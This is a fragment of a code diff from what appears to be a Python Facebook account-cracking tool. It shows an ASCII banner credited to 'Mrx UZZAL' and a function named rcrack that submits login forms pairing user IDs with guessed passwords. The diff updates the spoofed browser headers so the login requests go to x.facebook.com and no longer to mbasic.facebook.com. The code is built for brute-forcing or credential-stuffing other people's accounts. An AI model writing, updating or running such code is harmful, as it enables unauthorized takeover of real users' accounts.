@@ -161,12 +161,12 @@ class jihad:
 os.system("clear")
 logo =("""
 \x1b[1;96m    db    db d88888D d88888D  .d8b.  db \x1b[1;96m 
-\x1b[1;96m     `88    88 YP  d8' YP  d8' d8' `8b 88'\x1b[1;96m
-\x1b[1;96m      88    88    d8'     d8'  88ooo88 88\x1b[1;96m
-\x1b[1;96m      88    88   d8'     d8'   88~~~88 88\x1b[1;96m
-\x1b[1;96m      88b  d88  d8' db  d8' db 88   88 88booo.\x1b[1;96m
+\x1b[1;96m    88    88 YP  d8' YP  d8' d8' `8b 88'\x1b[1;96m
+\x1b[1;96m    88    88    d8'     d8'  88ooo88 88\x1b[1;96m
+\x1b[1;96m    88    88   d8'     d8'   88~~~88 88\x1b[1;96m
+\x1b[1;96m    88b  d88  d8' db  d8' db 88   88 88booo.\x1b[1;96m
 \x1b[1;96m      ~Y8888P' d88888P d88888P YP   YP Y88888P\x1b[1;96m
-\x1b[1;96m                          Mrx 𝗨𝗭𝗭𝗔𝗟  Brand\x1b[1;96m                                                                  
+\x1b[1;96m                     Mrx 𝗨𝗭𝗭𝗔𝗟  Brand\x1b[1;96m                                                                  
 
 \33[38;5;196m┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m⭐🌟 𝗨𝘇𝘇𝗮 𝗹𝘃𝗮𝘂 🌟⭐\33[38;5;196m━━━━━━━━━━
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;96m        : [★]  𝗠𝗗 𝗨𝗭𝗭𝗔𝗟 𝗛𝗢𝗦𝗦𝗔𝗜𝗡 𓃹         
@@ -271,13 +271,13 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'x.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/',
+            'referer': 'https://x.facebook.com/',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
